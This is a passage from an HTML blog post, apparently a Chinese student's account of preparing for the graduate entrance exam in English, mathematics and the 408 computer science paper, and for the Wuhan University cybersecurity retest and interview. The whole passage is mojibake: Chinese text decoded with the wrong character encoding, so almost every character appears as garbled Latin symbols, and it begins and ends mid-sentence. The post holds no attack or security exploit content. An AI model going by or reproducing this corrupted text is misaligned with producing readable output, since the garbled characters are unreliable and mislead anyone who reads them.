”è¿‡ç¨‹ä¸­èŠ±åœ¨è‹±è¯­ä¸Šçš„æ—¶é—´æ¯”è¾ƒå°‘ï¼Œæ‰€ä»¥å¯èƒ½ä¸å¤ªé€‚åˆåšå‚è€ƒã€‚</p><p>æœ¬äººç”¨çš„æŸè´å•è¯ APPï¼Œæ¯å¤©æ—©ä¸Šèµ·æ¥åƒé¥­çš„æ—¶å€™åªèƒŒäº† 30 ä¸ªæ–°å•è¯ + å¤ä¹  90 ä¸ªæ—§å•è¯ï¼Œç„¶ååˆ·ä¸€ç¯‡è‹±ä¸€æˆ–è‹±äºŒçš„çœŸé¢˜å®Œå‹æˆ–è€…é˜…è¯»ã€‚ä½œæ–‡å‚è€ƒç‹æ±Ÿæ¶›çš„ä½œæ–‡ä¹¦ï¼Œæœ‰äº›æ–‡ç« å†™çš„ç¡®å®ä¸é”™ï¼Œä½†ä¹Ÿæœ‰æ–‡ç« å†™çš„æ¯”è¾ƒæ¨¡æ¿åŒ–ï¼Œæœ€å¥½æ‹¿æ¥è‡ªå·±æ”¹æ”¹ï¼Œå½“ç„¶å¦‚æœåªæƒ³æ‹¿ä¸ªä¸€èˆ¬åˆ†çš„è¯ç›´æ¥ç½‘ä¸Šæ‰¾äº›æ¨¡æ¿èƒŒå°±è¡Œäº†ã€‚ä½†å°±ç¾¤é‡Œå…„å¼Ÿä»¬çš„å‘è¨€æ¥çœ‹ï¼Œæ¹–åŒ—è‹±è¯­ä½œæ–‡é«˜ä½åˆ†å·®å¾—è›®å¤§çš„ï¼Œæœ‰æ—¶é—´è¿˜æ˜¯è¦å¤šå‡†å¤‡ä¸‹ã€‚</p><p>å»ºè®®å¯ä»¥åœ¨å››å…­çº§è€ƒè¯•å‰é›†ä¸­å‡ å¤©å‡†å¤‡ä¸‹ä½œæ–‡ï¼Œç„¶ååœ¨å››å…­çº§è€ƒè¯•ä¸Šæ¨¡æ‹Ÿä¸‹ï¼Œé¡ºä¾¿åˆ·ä¸ªåˆ†ã€‚æœ¬äººè€ƒç ”æœŸé—´è€ƒäº†ä¸¤æ¬¡å…­çº§ï¼Œå†™ä½œ/ç¿»è¯‘éƒ½è¾¾åˆ°äº† 185+ã€‚</p><p>æ€»çš„æ¥è¯´ï¼Œæˆ‘è®¤ä¸ºè€ƒç ”è‹±è¯­æŠ“å‡†<strong>å•è¯+çœŸé¢˜ç²¾è¯»</strong>å°±å¤Ÿäº†ï¼Œè‹±è¯­çš„å­¦ä¹ æ˜¯<strong>ç§¯ç´¯+è¯­æ„ŸåŸ¹å…»</strong>çš„è¿‡ç¨‹ï¼Œé¡ºä¾¿è®°å¾—æŠŠå­—ç»ƒå¥½ã€‚</p><p>ç”±äºæœ¬äººæ²¡æœ‰å¤æ ¸ï¼Œå‚è€ƒç½‘ä¸Šè¿˜ç®—æƒå¨çš„ç­”æ¡ˆï¼Œä¼°æ‘¸ç€å®¢è§‚55 + ä¸»è§‚29ã€‚</p><h3 id="æ•°å­¦"><a href="#æ•°å­¦" class="headerlink" title="æ•°å­¦"></a>æ•°å­¦</h3><p>ç”±äºæœ¬äººé«˜è€ƒæ•°å­¦ç‚¸äº†ï¼Œä¸”å¤§å­¦é‡Œé«˜æ•°å’Œçº¿ä»£å­¦å¾—ä¹Ÿæ¯”è¾ƒå·®ï¼Œå¯¹æ•°å­¦ä¸€ç›´å¿ƒæœ‰ä½™æ‚¸ï¼Œå› æ­¤åœ¨ 1 æœˆå¼€å§‹å‡†å¤‡ã€‚</p><p>åŸºç¡€é˜¶æ®µï¼šèµ·åˆæˆ‘è·Ÿçš„æ˜¯æ±¤å®¶å‡¤çš„é›¶åŸºç¡€ç­ï¼Œä¸»è¦æ˜¯é‡æ¸©ä¸€äº›åŸºç¡€æ¦‚å¿µï¼Œè¾¹çœ‹è¾¹åšä¸€äº›ç¬”è®°ï¼Œåˆ° 3 æœˆå¤šæ‰çœ‹å®Œã€‚ç„¶å 4 æœˆå·¦å³å¼€å§‹è·Ÿæ­¦å¿ ç¥¥çš„åŸºç¡€è¯¾ï¼Œä»¥é«˜æ•°ä¸ºä¸»ï¼ŒæœŸé—´ä½¿ç”¨çš„ä¹ é¢˜å†Œæ˜¯æ±¤å®¶å‡¤çš„ã€Š1800ã€‹é¢˜ï¼Œåªå†™äº†åŸºç¡€ç¯‡ï¼ŒåŸºæœ¬ä¸Šæ˜¯çœ‹ä¸€ç« å†™ä¸€ç« ï¼Œæœ‰äº›çœ‹ä¸å¤ªæ‡‚çš„ç­”æ¡ˆæ€è·¯ä¼šæ‹ä¸‹æ¥ï¼Œåœ¨åƒé¥­è·¯ä¸Šæ€è€ƒï¼Œå¾ˆå¤šæ—¶å€™è‡ªç„¶å°±æƒ³é€šäº†ã€‚åœ¨ 6 æœˆåº•å‰ä¹Ÿå°±æ˜¯æš‘å‡å¼€å§‹å‰ï¼Œè·Ÿå®Œ<strong>æ­¦å¿ ç¥¥é«˜æ•°</strong>å’Œ<strong>ææ°¸ä¹çº¿ä»£</strong>çš„åŸºç¡€ç­ï¼Œåˆ·å®Œäº†ã€Š1800ã€‹çš„åŸºç¡€ç¯‡ï¼Œç®—æ˜¯åŸºæœ¬äº†è§£äº†é«˜æ•°/çº¿ä»£åŸºç¡€è€ƒç‚¹ã€‚</p><p>å¼ºåŒ–é˜¶æ®µï¼š7 æœˆæš‘å‡ç•™æ ¡ï¼Œå¼€å¯å¼ºåŒ–é˜¶æ®µã€‚è·Ÿçš„æ˜¯æ­¦å¿ ç¥¥çš„é«˜æ•°å¼ºåŒ–è¯¾å’Œææ°¸ä¹çš„çº¿ä»£å¼ºåŒ–è¯¾ï¼Œä¹ é¢˜å†Œåªç”¨äº†<strong>ã€Š660ã€‹</strong>å’Œ<strong>ã€Š880ã€‹</strong>ï¼Œè·Ÿä»¥å¾€æ€è·¯ä¸€æ ·ï¼Œä¹Ÿæ˜¯çœ‹ä¸€ç« åšä¸€ç« ï¼Œåšå®Œä¹‹åæ•´ä¸ªäººéƒ½é€šé€äº†å¾ˆå¤šï¼Œå¤§æ¦‚åˆ° 9 æœˆä¸­æ—¬åˆ·å®Œäº†è¿™ä¸¤æœ¬ä¹ é¢˜å†Œã€‚</p><p>åˆ·é¢˜å·©å›ºé˜¶æ®µï¼šæ¥ç€å¼€å§‹åˆ·æ•°å­¦å†å¹´çœŸé¢˜ï¼Œä» 1987 å¼€å§‹ï¼Œä¸€å¤©åˆ·ä¸€ä»½ï¼ˆæ—©æœŸçš„æ¯”è¾ƒç®€å•ï¼Œå¯ä»¥ä¸€å¤©åˆ·ä¸¤ä»½ï¼‰ï¼Œ150 åˆ†çš„å·åªç»™è‡ªå·±è®¡æ—¶ 2 ä¸ªå°æ—¶ 30 åˆ†é’Ÿï¼Œæ—©ä¸Šåˆ·å®Œå›å»åˆç¡ï¼Œç„¶åä¸‹åˆå›æ¥è®¢æ­£ã€‚å¦‚æœæ²¡æœ‰å¤ªå¤šæ—¶é—´æˆ–è€…åŸºç¡€æ¯”è¾ƒå¥½çš„è¯ï¼ŒçœŸé¢˜å¯ä»¥ç›´æ¥ä» 2008 å¹´å¼€å§‹åˆ·ã€‚å¤§æ¦‚ 11 æœˆå·¦å³å„å¤§åå¸ˆçš„é¢„æµ‹å·éƒ½è¦å‡ºå¥½äº†ï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯<strong>å¼ å®‡8+4</strong> å’Œ<strong>ææ—6+4</strong>ï¼Œä¹Ÿæ˜¯ä¸€å¤©åˆ·ä¸€ä»½ã€‚å¼ å®‡å·å†™å¾—æˆ‘æƒ³å“­ï¼Œåˆ†å·®æå¤§ï¼Œè¦ä¹ˆå†™å¾—ç‰¹åˆ«å¥½ï¼Œè¦ä¹ˆåŠ¨ä¸åŠ¨ 90+ï¼Œææ—è¿˜å¥½ï¼ŒåŸºæœ¬éƒ½æœ‰ 110+ã€‚ä½†é¢„æµ‹å·å®Œå…¨è¯´æ˜ä¸äº†ä»€ä¹ˆï¼Œä¸è¦å¤ªç„¦è™‘äº†ï¼Œä¸»è¦æ‹¿æ¥æŸ¥æ¼è¡¥ç¼ºç”¨çš„ï¼Œä½†è¦<strong>åšæŒåšä¿æŒæ‰‹æ„Ÿ</strong>ã€‚æœ‰äº›é¢˜ç›®ä¸æ‡‚å¯ä»¥å» bilibili æ‰¾ä¸€äº›å¤§ä½¬ up ä¸»çš„è§†é¢‘çœ‹çœ‹ï¼Œä¸ªäººæ¯”è¾ƒæ¨èï¼šæ²¡å’‹äº†ã€‚</p><p>æ€»çš„æ¥è¯´ï¼Œæ•°å­¦çš„æ¯ä¸ªé˜¶æ®µéƒ½å¾ˆé‡è¦ï¼Œæ˜¯éœ€è¦æ¯å¤©èŠ±å¤§æŠŠæ—¶é—´çš„ï¼Œæˆ‘ä¸»è¦å‰ä¸­æœŸèŠ±çš„æ—¶é—´æ¯”è¾ƒå¤šï¼Œç™½å¤©ä¸Šä¸‹åˆéƒ½æ‹¿æ¥å¤ä¹ æ•°å­¦ï¼Œç„¶ååæœŸåˆ·é¢˜é˜¶æ®µå°±æ˜¯æ—©ä¸Šåˆ·ä¸€å¥—æ•°å­¦å·å­ï¼Œä¸‹åˆèŠ±ä¸€ä¸ªå°æ—¶ä¸åˆ°çš„æ—¶é—´çº é”™ï¼Œçº é”™å®Œåçš„æ—¶é—´ç»™æ”¿æ²»å’Œè‹±è¯­ã€‚å¯¹äºåå¸ˆçš„é€‰æ‹©ï¼Œå¼ å®‡å’Œæ­¦å¿ ç¥¥éƒ½å¯ä»¥å§ï¼Œèº«è¾¹ç ”å‹éƒ½è¯´æŒºä¸é”™çš„ï¼Œä½†æœ€åè¿˜å¾—æ˜¯é è‡ªå·±ã€‚</p><p>ps. æœ€åè€ƒè¯•çš„æ—¶å€™æ•°å­¦é€‰æ‹©åªç®—äº†ä¸€éï¼Œé€‰é¡¹åˆ†å¸ƒ 1 3 3 3ï¼Œè®©æˆ‘æœ‰ç‚¹å®³æ€•ï¼Œä½†æˆ‘è¿˜æ˜¯åšæŒç¬¬ä¸€æ„Ÿè§‰ï¼Œå¿ƒç†æƒ³ç€é¡¶å¤šé”™ä¸€é“ï¼Œç¨³ä¸€ç‚¹ï¼Œæœ€åé€‰æ‹©å…¨å¯¹ï¼Œä½†å¡«ç©ºé¢˜ç¬¬ä¸€é¢˜å°±é”™äº†ï¼Œè®©æˆ‘å¾ˆæ— è¯­ï¼Œæ‰€ä»¥<strong>ç®€å•é¢˜æœ‰æ—¶é—´å¾—å¤šéªŒç®—</strong>ğŸ˜­ã€‚çœ‹åˆ°å¤§é¢˜çš„æ—¶å€™æœ‰ç‚¹ç‚¹æ‡µï¼Œæ„Ÿè§‰ä¸åƒå¾€å¸¸çš„é¢˜å‹ï¼Œä½†åšä¸‹å»å‘ç°ä¹Ÿåªæ˜¯å¥—äº†å±‚çš®ï¼Œä¹ŸåŸºæœ¬ä¸€éè¿‡ï¼Œé™¤äº†è¯æ˜é¢˜ç¬¬äºŒé—®åŸºæœ¬éƒ½å†™å‡ºæ¥äº†ã€‚</p><p>ç”±äºæœ¬äººæ²¡æœ‰å¤æ ¸ï¼Œå‚è€ƒç½‘ä¸Šè¿˜ç®—æƒå¨çš„ç­”æ¡ˆï¼Œä¼°æ‘¸ç€å®¢è§‚70 + ä¸»è§‚59ã€‚</p><h3 id="408è®¡ç®—æœºä¸“ä¸šåŸºç¡€"><a href="#408è®¡ç®—æœºä¸“ä¸šåŸºç¡€" class="headerlink" title="408è®¡ç®—æœºä¸“ä¸šåŸºç¡€"></a>408è®¡ç®—æœºä¸“ä¸šåŸºç¡€</h3><p>è™½æ˜¯ç§‘ç­ï¼Œä½†æ²¡ä¸Šè¿‡è®¡ç»„å’Œæ“ä½œç³»ç»Ÿçš„è¯¾ç¨‹ã€‚ä¸è¿‡æœ‰äºŒè¿›åˆ¶å®‰å…¨å­¦ä¹ ç»å†ï¼Œå­¦èµ·æ¥ä¸ç®—å¤ªç´¯ã€‚è€ƒç ”æœŸé—´ï¼Œæˆ‘ä¸€èˆ¬æŠŠæ™šä¸Š 4 ä¸ªå°æ—¶å·¦å³çš„æ—¶é—´æ‹¿æ¥å¤ä¹  408ã€‚</p><p>å­¦ 408 è¦<strong>åå¤å¤šæ¬¡</strong>ï¼Œå‚è€ƒä¹¦ç”¨<strong>ç‹é“</strong>å°±å¤Ÿäº†ã€‚æˆ‘ 3 æœˆå¼€å§‹è·Ÿç‹é“çš„åŸºç¡€è¯¾ï¼Œçœ‹è¯¾é¡ºåºæ˜¯æ•°æ®ç»“æ„ã€è®¡ç»„ã€æ“ä½œç³»ç»Ÿã€è®¡ç½‘ï¼Œå¬ä¸€ç« è¯¾åšä¸€ç« è¯¾çš„è¯¾åä¹ é¢˜ï¼Œå¬çš„è¿‡ç¨‹ä¸­å¯ä»¥åšäº›ç®€å•çš„ç¬”è®°ï¼Œå¯ä»¥åšåœ¨ä¹¦ä¸Šï¼Œä¹Ÿå¯ä»¥åšåœ¨å¦å¤–çš„ç¬”è®°æœ¬ä¸Šã€‚æˆ‘å¤§æ¦‚æ˜¯ 6 æœˆå¤šå¬å®Œç¬¬ä¸€éåï¼Œå‘ç°å¾ˆå¤šä¹‹å‰çš„æ¦‚å¿µéƒ½ä¼šå¿˜æ‰äº†ã€‚è¿™æ˜¯æ­£å¸¸çš„ï¼Œ408 å†…å®¹æ¯”è¾ƒå¤šï¼Œçœ‹åˆ°ç¬¬äºŒéç¬¬ä¸‰éå›å¿†å¾—ä¼šè¶Šæ¥è¶Šæ¥å¿«ã€‚</p><p>æˆ‘ 6 æœˆåä¹Ÿå°±æ˜¯æš‘å‡æœŸé—´åˆç»†å¬äº†ä¸€éåŸºç¡€è¯¾ï¼Œä¸€äº›ç®—æ³•è¿‡ç¨‹ã€PV æ“ä½œéƒ½è·Ÿç€åœ¨çº¸ä¸Šæ¨¡æ‹Ÿäº†ä¸€éï¼Œå¦å¤–åšäº†åšåšçš„å…­æœ¬ç¬”è®°æœ¬ï¼Œæœ€åè‡ªå·±æ•´ç†çš„æ—¶å€™ä¹Ÿè¿˜ç®—æ˜¯æœ‰ç”¨ã€‚ï¼ˆä½†ç¬”è®°åšå¾—å¤ªå†—æ‚äº†ï¼Œè€Œä¸”æ—¶é—´æˆæœ¬é«˜ï¼Œç²¾ç®€ç‚¹ä¼šå¥½äº›ï¼‰</p><p>9 æœˆå¼€å§‹ä¼šæ¯”è¾ƒè¿·èŒ«ï¼Œæ„Ÿè§‰å¾ˆå¤šéƒ½å­¦äº†ï¼Œé€‰æ‹©é¢˜èƒ½åšï¼Œä½†è¯•å·å¤§é¢˜è¿˜æ˜¯ä¸ä¼šï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥å¼€å§‹è·Ÿç‹é“çš„å¼ºåŒ–è¯¾ï¼ˆå¾ˆé‡è¦ï¼Œå¯ä»¥æ›´æ—©å¼€å§‹ï¼ï¼ï¼‰ï¼Œå¼ºåŒ–è¯¾ä¸»è¦å¯¹<strong>å¸¸è§è€ƒç‚¹</strong>åšäº†æ¢³ç†ï¼Œä¼šèŠ±å‡ ä¸ªè¯¾æ—¶å¸®ä½ ç†è§£ä¸€ä¸ªçŸ¥è¯†åˆ†æ”¯ï¼Œä¹Ÿä¼šæ•™ä¸€äº›ç­”é¢˜æŠ€å·§ã€‚10 æœˆå¼€å§‹å°±æ˜¯åˆ·çœŸé¢˜ï¼Œ<strong>çœŸé¢˜ç‰¹åˆ«ç‰¹åˆ«é‡è¦ï¼Œå› ä¸ºçŸ¥è¯†ç‚¹ä¼šåå¤è€ƒï¼ï¼ï¼ï¼</strong>æˆ‘æ˜¯æ¯å¤©æ™šä¸Šè®¡æ—¶åšä¸€å¼ ï¼Œç„¶åæ”¾åˆ°ç¬¬äºŒå¤©ä¸‹åˆå’Œæ•°å­¦ä¸€èµ·æ ¡å¯¹ã€‚æœ‰æ—¶é—´çš„è¯çœŸé¢˜ä¸€å®šè¦å¤šè¿‡å‡ è½®ï¼Œæˆ‘ç¬¬ä¸€è½®æ˜¯è‡ªå·±å†™ä¸€éï¼Œç¬¬äºŒè½®å°±æ˜¯çœ‹ä¸€é¢˜æ ¡å¯¹ä¸€é¢˜ï¼Œè¦æŠŠæ¯ä¸ªé€‰æ‹©é¢˜é€‰é¡¹éƒ½ææ¸…æ¥šï¼Œå¤§é¢˜æŠŠå‡ ä¸ªå¸¸è§ç®—æ³•ã€PV æ“ä½œéƒ½å¤šé»˜å†™å‡ éã€‚æœ‰ç©ºå¯ä»¥å†å†™ä¸€éç‹é“è¯¾åä¹ é¢˜ï¼ŒæŸ¥æ¼è¡¥ç¼ºï¼ŒæŠŠä¸€äº›é™Œç”Ÿçš„çŸ¥è¯†ç‚¹è®°å½•åœ¨ä¸‹æ¥ï¼Œä¸»æ‰“ä¸€ä¸ª<strong>åå¤å¤šæ¬¡</strong>ã€‚</p><p>æ€»çš„æ¥è¯´ï¼Œå­¦ 408 çš„è¿‡ç¨‹ä¸€å®šè¦æœ‰<strong>è€å¿ƒ</strong>ï¼Œæœ‰å¾ˆé•¿ä¸€æ®µæ—¶é—´æˆ‘éƒ½ä¼šè§‰å¾—è‡ªå·±å¥½åƒå•¥ä¹Ÿæ²¡å­¦æ‡‚ï¼Œä½†åˆ°äº†åæœŸå¼ºåŒ–ã€åˆ·å·é˜¶æ®µä¼šå‘ç°éƒ½æ˜¯é‚£å‡ ä¸ªçŸ¥è¯†ç‚¹åœ¨åå¤è€ƒï¼Œæ‰€ä»¥æœ‰å¾ˆå¤§ä¸€éƒ¨åˆ†åˆ†æ•°åŠªåŠªåŠ›å°±èƒ½æ‹¿åˆ°ã€‚  </p><p>ps. ä»Šå¹´æ­»åœ¨æ•°æ®ç»“æ„ä¸Šäº†ï¼Œå…‰æ•°æ®ç»“æ„é€‰æ‹©å°±é”™äº† 5 ä¸ªï¼Œå…¶ä»–æ¯é—¨é€‰æ‹©éƒ½åªé”™ 1 ä¸ªï¼Œæ•°æ®ç»“æ„ç¬¬äºŒå¤§é¢˜å¤–éƒ¨æ’åºç®—æ³•æ€æƒ³æ²¡æƒ³èµ·æ¥ï¼Œå°±å¯¹äº†ç¬¬äºŒå°é—®ï¼Œæ“ä½œç³»ç»Ÿæœ‰ä¸€å¤§é¢˜æ’åºçš„ä¹Ÿçº ç»“äº†å¾ˆä¹…ã€‚æ ¡å¯¹å®Œç­”æ¡ˆä¸€ç›´è§‰å¾—è‡ªå·±åªæœ‰ 100 åˆ†å·¦å³ï¼Œæ‹…å¿ƒäº†å¥½ä¹…ğŸ˜­ï¼Œå¥½åœ¨æœ€åç»“æœè¿˜ä¸é”™ã€‚</p><p>ç”±äºæœ¬äººæ²¡æœ‰å¤æ ¸ï¼Œå‚è€ƒç½‘ä¸Šè¿˜ç®—æƒå¨çš„ç­”æ¡ˆï¼Œä¼°æ‘¸ç€å®¢è§‚64 + ä¸»è§‚46ã€‚</p><h2 id="å¤è¯•è§„åˆ’"><a href="#å¤è¯•è§„åˆ’" class="headerlink" title="å¤è¯•è§„åˆ’"></a>å¤è¯•è§„åˆ’</h2><p>æ­¦å®‰å¤è¯•åŒ…æ‹¬ç¬”è¯•å’Œç»¼åˆé¢è¯•ï¼ˆä¸»è¦æ˜¯è‹±è¯­é¢è¯•å’Œä¸“ä¸šé¢è¯•ï¼‰ã€‚</p><p>åŸºæœ¬é—®é¢˜ä¹‹å‰æœ‰å­¦é•¿æ€»ç»“è¿‡ï¼š<a href="https://blog.wangx.wang/index.php/archives/171/">å…³äºæ­¦å¤§ç½‘å®‰å¤è¯•çš„ä¸€äº›QA</a>ï¼Œç”±äºä¸èƒ½é€éœ²å…·ä½“å†…å®¹ï¼Œå°±ç®€å•è®²è®²å¦‚ä½•å‡†å¤‡çš„ã€‚</p><h3 id="ç¬”è¯•"><a href="#ç¬”è¯•" class="headerlink" title="ç¬”è¯•"></a>ç¬”è¯•</h3><p>å‚è€ƒä¹¦ç›®ï¼šã€Šä¿¡æ¯ç³»ç»Ÿå®‰å…¨æ¦‚è®ºã€‹ï¼ŒçŸ³æ–‡æ˜Œè‘—ã€‚ç¬¬äºŒç¬¬ä¸‰ç‰ˆéƒ½å¯ä»¥ã€‚</p><p>è€ƒå¯Ÿçš„è¯¾å†…çŸ¥è¯†æ¯”è¾ƒåŸºç¡€ï¼Œä»<strong>æ¦‚å¿µã€ä¼˜ç¼ºç‚¹ã€å®ç°æ–¹æ³•ã€ä¾‹å­</strong>è¿™å‡ ä¸ªè§’åº¦æ•´ç†å³å¯ã€‚</p><p>æœ‰æ¶‰åŠä¸€äº›è¯¾å¤–çš„çŸ¥è¯†ï¼Œä½†é—®å¾—ä¹Ÿå¾ˆå¼€æ”¾ã€‚</p><p>ps. æœ€åå†™å¾—æ»¡æ»¡å½“å½“ï¼Œæ‹¿äº†ä¸ª 80 å¹³å‡åˆ†ã€‚</p><h3 id="é¢è¯•"><a href="#é¢è¯•" class="headerlink" title="é¢è¯•"></a>é¢è¯•</h3><p>å¤è¯•è‹±è¯­å‚è€ƒæ–‡ç« ï¼š<a href="http://www.cskaoyan.com/forum.php?mod=viewthread&tid=654288&highlight=%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD">19æ­¦å¤§ç½‘å®‰è‹±è¯­å£è¯­å‡†å¤‡èµ„æ–™åŠä¸€ç‚¹ä¸ªäººä½“ä¼š</a></p><p>è‹±è¯­é¢è¯•ï¼šå‚è€ƒä¸Šé¢çš„æ–‡ç« å‡†å¤‡äº†å°†è¿‘åæ¥ä¸ªæ—¥å¸¸é—®é¢˜ï¼Œæœ€åä¹ŸæŠ¼ä¸­äº†ä¸¤ä¸ªï¼Œæœ€å¥½ä¹Ÿå‡†å¤‡ä¸‹ä¸“ä¸šé—®é¢˜ã€‚è‹±è¯­é¢è¯•è¿‡ç¨‹ä¸­ï¼Œæ„Ÿè§‰è€ƒå®˜æ›´æ³¨é‡<strong>å£è¯­çš„æµç•…åº¦å’Œé€»è¾‘</strong>ï¼Œè€Œéå£è¯­å†…å®¹ï¼Œæ‰€ä»¥æ— éœ€å¤ªå¤šé«˜çº§è¯æ±‡ã€‚</p><p>ä¸“ä¸šé¢è¯•ï¼šå¯ä»¥äº¤<strong>ç®€å†</strong>ï¼Œä¹Ÿå»ºè®®æœ‰ç«èµ›ã€é¡¹ç›®ã€è®ºæ–‡çš„åŒå­¦äº¤ç®€å†ï¼Œå‰ææ˜¯è¦æ¸…æ¥šè‡ªå·±å·¥ä½œçš„éƒ¨åˆ†ã€‚<strong>æ¯•è®¾</strong>ä¹Ÿè¦å¥½å¥½å‡†å¤‡ä¸€ä¸‹ï¼Œå¦‚æœæ˜¯è·Ÿå®‰å…¨æœ‰å…³çš„ï¼Œè€å¸ˆå¾ˆå¯èƒ½ä¼šé—®ã€‚</p><p>ps. æˆ‘åœ¨é¢è¯•å‰å¤´è„‘ä¸€ç‰‡ç©ºç™½ï¼Œç´§å¼ å¾—è‡ªæˆ‘ä»‹ç»ä¹ŸèƒŒä¸é¡ºäº†ğŸ˜­ï¼Œå°±ç´¢æ€§æ”¾ç©ºè‡ªå·±ğŸ¤¯ï¼Œé¢è¯•çš„æ—¶å€™å°±æ˜¯æƒ³åˆ°å•¥è¯´å•¥ï¼Œç¼åˆäº†å¥½å¤šä¸ªæå‰å‡†å¤‡çš„å›ç­”ã€‚è€å¸ˆä»¬ä¹Ÿéƒ½å¾ˆå’Œè”¼ï¼Œè®¸å¤šæ·±å…¥çš„æ–¹å‘ä¹Ÿæ²¡æœ‰è¿½é—®ï¼Œæ—¶é—´å¾ˆå¿«å°±è¿‡å»å•¦~</p><p>æœ€ç»ˆæœ¬äººå¤è¯•æˆç»©æ„æ–™ä¹‹å¤–åœ°ä½äºå°ç»„ç¬¬ä¸€ï¼Œå±å®å—å® è‹¥æƒŠğŸ˜­ï¼Œæ„Ÿè°¢å„ä½è€å¸ˆæŠ¬çˆ±ã€‚</p><h2 id="ä¸ªäººå¿ƒå¾—ä¸è‡´è°¢"><a href="#ä¸ªäººå¿ƒå¾—ä¸è‡´è°¢" class="headerlink" title="ä¸ªäººå¿ƒå¾—ä¸è‡´è°¢"></a>ä¸ªäººå¿ƒå¾—ä¸è‡´è°¢</h2><h3 id="ä¸ªäººå¿ƒå¾—"><a href="#ä¸ªäººå¿ƒå¾—" class="headerlink" title="ä¸ªäººå¿ƒå¾—"></a>ä¸ªäººå¿ƒå¾—</h3><ul><li>è€ƒç ”æ‹©æ ¡å¾ˆé‡è¦ï¼Œä½†ä¹Ÿä¸ç”¨å¤ªæ—©å°±æ•²å®šè¦è€ƒæŸä¸ªå­¦æ ¡ï¼ŒåæœŸæ ¹æ®è‡ªèº«æƒ…å†µå’Œæ‹›ç”Ÿæ–¹æ¡ˆå†åšæŠ‰æ‹©ä¹Ÿä¸è¿Ÿã€‚å¦‚æœåªæ˜¯æƒ³å›¾ä¸ª 211 å­¦å†ï¼Œå¯ä»¥é€‰å†œæ—ã€è´¢ç»ã€å¸ˆèŒƒç±»çš„é«˜æ ¡çš„ä¸€äº›è®¡ç®—æœºäº¤å‰ä¸“ä¸šã€‚</li><li>å¦‚æœè€ƒè®¡ç®—æœºæ–¹å‘çš„ä¸“ä¸šï¼Œä¼˜å…ˆå‡†å¤‡ 408ï¼Œ408 æ˜¯å¤§åŠ¿æ‰€è¶‹ï¼Œè€Œä¸”åœ¨æˆ‘çœ‹æ¥ä¹Ÿæ˜¯ç§‘ç­å­¦ç”Ÿåº”å½“å…·å¤‡çš„çŸ¥è¯†åŸºç¡€ã€‚</li><li>IT ä¸“ä¸šè€ƒç ”éš¾åº¦ä¸€èˆ¬æ˜¯ï¼šè®¡ç®—æœº &gt; è½¯å·¥ â‰ˆ ç½‘å®‰ â‰ˆ äººå·¥æ™ºèƒ½ã€‚ä½†è¿‘å‡ å¹´å¤§å®¶ä¼¼ä¹éƒ½å¤ªè¿‡æ±‚ç¨³äº†ï¼Œä»Šå¹´æ‰©æ‹›çš„æ­¦å¤§ç½‘å®‰ä¸“ç¡•åˆ’çº¿ 355ï¼Œç¼©æ‹›çš„æ­¦å¤§è®¡ç§‘ä¸“ç¡•åˆ’çº¿ 360ï¼Œç¼©æ‹›çš„å¦å¤§è®¡ç§‘ä¸“ç¡•åˆ’çº¿ 350ï¼Œè€Œä¸”ç¦å»ºè¿˜æ˜¯æ°´åŒºï¼Œåªèƒ½è¯´è¢«åŠé€€çš„äººä¸å°‘ã€‚å¦å¤–ï¼Œåˆšæ”¹è€ƒ 408 çš„å—ç†å·¥å¥½åƒä¹Ÿç‚¸äº†ï¼Œå°±è¿åŒéä¹Ÿç‚¸å¾—ç¦»è°±ï¼Œè€ƒæˆ‘ä»¬æœ¬æ ¡ 22408 çš„è½¯å·¥ä¸“ç¡•å±…ç„¶èƒ½æœ‰ 391 çš„è€ƒç”Ÿï¼Œåªèƒ½è¯´å¤ªå·è¾£ï¼</li></ul><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202304052028047.png" alt="image-20230405202822686" style="zoom: 33%;" /><ul><li>å¯ä»¥é€šè¿‡ç›®æ ‡é™¢æ ¡çš„è€ƒç ”ç¾¤æ”¶é›†èµ„æ–™ï¼Œä¸€èˆ¬æ¥è¯´ç‹é“çš„ç¾¤æˆå‘˜äººæ•°å¤šä¸€äº›ã€‚æ‹›ç”Ÿä¿¡æ¯å‡ºåï¼Œç¾¤é‡Œå°±ä¼šå¼€å§‹â€œå¼•æµâ€å’Œâ€œåŠé€€â€ï¼Œå°±åƒæˆ‘åŸæœ¬åœ¨å¦å¤§è®¡ç§‘ç¾¤ï¼Œè¢«å¼•åˆ°äº†æ­¦å¤§ç½‘å®‰ç¾¤ã€‚å…¶æ¬¡ï¼Œåˆ‡å‹¿æ°´ç¾¤ï¼Œåæœˆç¡®è®¤é™¢æ ¡åæŠŠå…¶ä»–é™¢æ ¡çš„ç¾¤é€€äº†ã€‚</li><li>è­¦æƒ• Bä¹ åŒ¿åç”¨æˆ·æ‰“å¿ƒæ€ç‰Œï¼ŒåŠ¨ä¸åŠ¨â€œå°é“æ¶ˆæ¯â€ã€â€œå†…éƒ¨æ¶ˆæ¯â€ã€â€œä»Šå¹´çˆ†ç‚¸â€ï¼Œç»™ä»–ç‚¹ä¸ªğŸ‘çœ‹ä»–è¿˜å‘ä¸å‘ç”µï¼</li><li>æŒ‰ç…§è‡ªå·±æœ€å¥½çš„çŠ¶æ€å­¦ï¼Œä¸å¿…è·Ÿä¸Šåˆ«äººçš„èŠ‚å¥ã€‚åƒæˆ‘çš„å­¦ä¹ æ—¶é—´ä¸€èˆ¬æ˜¯æ—©ä¸Šï¼š9 ~ 12ï¼Œä¸‹åˆï¼š14 ~ 17ï¼Œæ™šï¼š18 ~ 22ã€‚å¶å°”ä¹Ÿä¼šæ‘¸ğŸŸï¼Œæ‰“æ‰“æ¸¸æˆä»€ä¹ˆçš„ï¼Œä½†æ‰“å®Œè®°å¾—å¸æ‰ï¼ˆç˜¾çŠ¯äº†ä¸‹å›æ¥åï¼Œæ‰“å®Œå†å¸ï¼‰ï¼Œç°åœ¨å¯¹æ¸¸æˆå·²æ— æ„Ÿï¼Ÿ</li><li>å’Œç ”å‹ä»¬å®šæœŸçº¦ä¸ªé¥­ï¼Œæ‰“å¡å‘¨è¾¹ä¸€äº›ç¾é£Ÿåº—ï¼Œé‡Šæ”¾è€ƒç ”å‹åŠ›ã€‚</li></ul><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202304052118011.png" alt="image-20230405211807371" style="zoom: 40%;" /><h3 id="è‡´è°¢"><a href="#è‡´è°¢" class="headerlink" 